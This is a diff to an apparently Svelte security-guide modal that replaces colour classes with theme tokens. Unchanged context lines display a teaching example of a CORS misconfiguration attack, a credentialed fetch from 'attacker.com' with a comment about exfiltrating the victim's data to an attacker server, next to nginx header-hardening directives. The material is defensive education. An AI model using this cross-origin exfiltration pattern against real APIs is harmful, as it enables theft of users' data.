@@ -58,7 +58,7 @@
         ></div>
         <button
           onclick={close}
-          class="absolute top-4 right-4 p-2 text-zinc-400 hover:text-white bg-white/5 hover:bg-orange-500/20 rounded-xl transition-all border border-white/5 hover:border-orange-500/30 font-medium"
+          class="absolute top-4 right-4 p-2 text-muted hover:text-primary-text bg-white/5 hover:bg-orange-500/20 rounded-xl transition-all border border-white/5 hover:border-orange-500/30 font-medium"
           aria-label="Close guide modal"
         >
           <X size={18} />
@@ -74,12 +74,12 @@
               <GraduationCap size={28} class="text-orange-400" />
             </div>
             <div>
-              <h2 class="text-2xl font-bold tracking-tight text-white">
+              <h2 class="text-2xl font-bold tracking-tight text-primary-text">
                 {m.sec_posture_title
                   ? m.sec_posture_title()
                   : "Security Posture & Headers"}
               </h2>
-              <p class="text-sm text-zinc-400 mt-1 max-w-md">
+              <p class="text-sm text-muted mt-1 max-w-md">
                 Attack Surface Mapping & Misconfiguration Discovery.
               </p>
             </div>
@@ -95,7 +95,7 @@
                 class="flex items-center gap-2 px-3 py-1.5 rounded-md text-sm font-medium transition-all {activeTab ===
                 tab.id
                   ? 'bg-orange-500/20 text-orange-300 border border-orange-500/20 shadow-sm'
-                  : 'text-zinc-500 hover:text-zinc-300 hover:bg-white/5 border border-transparent'}"
+                  : 'text-muted hover:text-primary-text hover:bg-white/5 border border-transparent'}"
               >
                 <tab.icon size={14} />
                 <span class="hidden sm:inline">{tab.label}</span>
@@ -115,7 +115,7 @@
 
             <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
               <div class="space-y-4">
-                <p class="text-zinc-300 text-sm leading-relaxed">
+                <p class="text-primary-text text-sm leading-relaxed">
                   The "overall grade" calculated during reconnaissance acts as
                   an indicator of your DevSecOps maturity. If basic headers are
                   missing, attackers assume the underlying application logic is
@@ -129,7 +129,7 @@
                   >
                     <Globe size={16} /> Essential Defense Layers
                   </h4>
-                  <ul class="space-y-3 text-sm text-zinc-400">
+                  <ul class="space-y-3 text-sm text-muted">
                     <li class="flex items-start gap-2">
                       <ArrowRight
                         size={14}
@@ -245,7 +245,7 @@
                 Exploiting Misconfigurations
               </h3>
             </div>
-            <p class="text-sm text-zinc-400 mb-6 max-w-3xl">
+            <p class="text-sm text-muted mb-6 max-w-3xl">
               When security headers are absent, attackers leverage the browser
               itself as the weapon. A missing CSP header means any injected
               HTML/JS will execute seamlessly.
@@ -256,23 +256,23 @@
               class="bg-[#0d1117] rounded-xl border border-orange-500/10 shadow-2xl overflow-hidden font-mono text-xs sm:text-sm "
             >
               <div
-                class="bg-zinc-900/80 px-4 py-3 flex items-center gap-2 border-b border-white/5 backdrop-blur"
+                class="bg-surface/80 px-4 py-3 flex items-center gap-2 border-b border-white/5 backdrop-blur"
               >
                 <div class="w-3 h-3 rounded-full bg-red-500/80"></div>
                 <div class="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                 <div class="w-3 h-3 rounded-full bg-green-500/80"></div>
-                <span class="ml-2 text-zinc-500 text-xs tracking-wider"
+                <span class="ml-2 text-muted text-xs tracking-wider"
                   >attacker.com/exploit.html</span
                 >
               </div>
               <div
-                class="p-5 space-y-3 text-zinc-300 h-72 overflow-y-auto custom-scrollbar"
+                class="p-5 space-y-3 text-primary-text h-72 overflow-y-auto custom-scrollbar"
               >
-                <p class="text-zinc-500 italic">
+                <p class="text-muted italic">
                   // Scenario: Target API has CORS configured with
                   Access-Control-Allow-Origin: *
                 </p>
-                <p class="text-zinc-500 italic">
+                <p class="text-muted italic">
                   // and allows credentials. The attacker crafts this payload on
                   their own domain:
                 </p>
@@ -289,7 +289,7 @@
                     >,
     <span class="text-purple-400">credentials</span>: <span
                       class="text-orange-300">'include'</span
-                    > <span class="text-zinc-500 italic"
+                    > <span class="text-muted italic"
                       >// Sends victim's cookies automatically</span
                     >
   &#125;)
@@ -297,7 +297,7 @@
                       class="text-blue-400">json</span
                     >())
   .<span class="text-blue-400">then</span>(data =&gt; &#123;
-    <span class="text-zinc-500 italic"
+    <span class="text-muted italic"
                       >// Exfiltrate sensitive data to attacker server</span
                     >
     <span class="text-blue-400">fetch</span>(<span class="text-orange-300"
@@ -326,7 +326,7 @@
             <h3 class="text-lg font-semibold text-emerald-400 mb-4">
               DevSecOps Standard Practices
             </h3>
-            <p class="text-sm text-zinc-400 mb-6 max-w-3xl">
+            <p class="text-sm text-muted mb-6 max-w-3xl">
               Inject headers at your reverse proxy (Nginx/Traefik) or directly
               inside your application framework middleware. Scan pipelines for
               regressions.
@@ -342,8 +342,8 @@
                 NGINX Hardening
               </div>
               <div class="p-6 overflow-x-auto pt-10 custom-scrollbar">
-                <pre class="text-zinc-300 leading-relaxed">
-<span class="text-zinc-500 italic"
+                <pre class="text-primary-text leading-relaxed">
+<span class="text-muted italic"
                     ># 1. Enforce HTTPS only (HSTS) with max-age of 1 year</span
                   >
 <span class="text-purple-400">add_header</span> <span class="text-green-300"
@@ -352,7 +352,7 @@
                     >"max-age=31536000; includeSubDomains; preload"</span
                   > <span class="text-orange-300">always</span>;
 
-<span class="text-zinc-500 italic"
+<span class="text-muted italic"
                     ># 2. Prevent Clickjacking (framing context)</span
                   >
 <span class="text-purple-400">add_header</span> <span class="text-green-300"
@@ -361,7 +361,7 @@
                     class="text-orange-300">always</span
                   >;
 
-<span class="text-zinc-500 italic"
+<span class="text-muted italic"
                     ># 3. Disable MIME-sniffing (protects from malicious file uploads bypassing filters)</span
                   >
 <span class="text-purple-400">add_header</span> <span class="text-green-300"
@@ -370,7 +370,7 @@
                     class="text-orange-300">always</span
                   >;
 
-<span class="text-zinc-500 italic"
+<span class="text-muted italic"
                     ># 4. Strict Content-Security-Policy (Blocks external scripts/eval)</span
                   >
 <span class="text-purple-400">add_header</span> <span class="text-green-300"
@@ -379,7 +379,7 @@
                     >"default-src 'self'; script-src 'self'; object-src 'none';"</span
                   > <span class="text-orange-300">always</span>;
 
-<span class="text-zinc-500 italic"># 5. Remove server identity</span>
+<span class="text-muted italic"># 5. Remove server identity</span>
 <span class="text-purple-400">server_tokens</span> <span class="text-red-400"
                     >off</span
                   >;</pre>
@@ -431,9 +431,9 @@
       <div
         class="bg-[#0A0C10] p-4 border-t border-orange-500/10 flex items-center justify-between shrink-0 shadow-[0_-10px_20px_-10px_rgba(0,0,0,0.5)] z-20"
       >
-        <div class="text-xs text-zinc-500 hidden sm:block">
+        <div class="text-xs text-muted hidden sm:block">
           Use <kbd
-            class="px-2 py-1 bg-white/5 rounded mx-1 text-zinc-400 border border-white/10 font-mono"
+            class="px-2 py-1 bg-white/5 rounded mx-1 text-muted border border-white/10 font-mono"
             >Esc</kbd
           > or click outside to dismiss
         </div>
@@ -443,7 +443,7 @@
           {#if activeTab > 0}
             <button
               onclick={prevTab}
-              class="flex items-center gap-1.5 px-5 py-2.5 bg-white/5 hover:bg-white/10 text-zinc-300 text-sm font-medium rounded-xl border border-white/5 hover:border-white/10 transition-all focus:ring-2 focus:ring-white/10 outline-none"
+              class="flex items-center gap-1.5 px-5 py-2.5 bg-white/5 hover:bg-white/10 text-primary-text text-sm font-medium rounded-xl border border-white/5 hover:border-white/10 transition-all focus:ring-2 focus:ring-white/10 outline-none"
             >
               <ChevronLeft size={16} /> Previous
             </button>
@@ -454,7 +454,7 @@
           {#if activeTab < tabs.length - 1}
             <button
               onclick={nextTab}
-              class="flex items-center gap-1.5 px-6 py-2.5 bg-orange-600 hover:bg-orange-500 text-white text-sm font-semibold rounded-xl shadow-[0_0_20px_rgba(249,115,22,0.4)] transition-all transform hover:scale-105 active:scale-95 focus:ring-2 focus:ring-orange-500/50 outline-none"
+              class="flex items-center gap-1.5 px-6 py-2.5 bg-orange-600 hover:bg-orange-500 text-primary-text text-sm font-semibold rounded-xl shadow-[0_0_20px_rgba(249,115,22,0.4)] transition-all transform hover:scale-105 active:scale-95 focus:ring-2 focus:ring-orange-500/50 outline-none"
             >
               Continue <ChevronRight size={16} />
             </button>
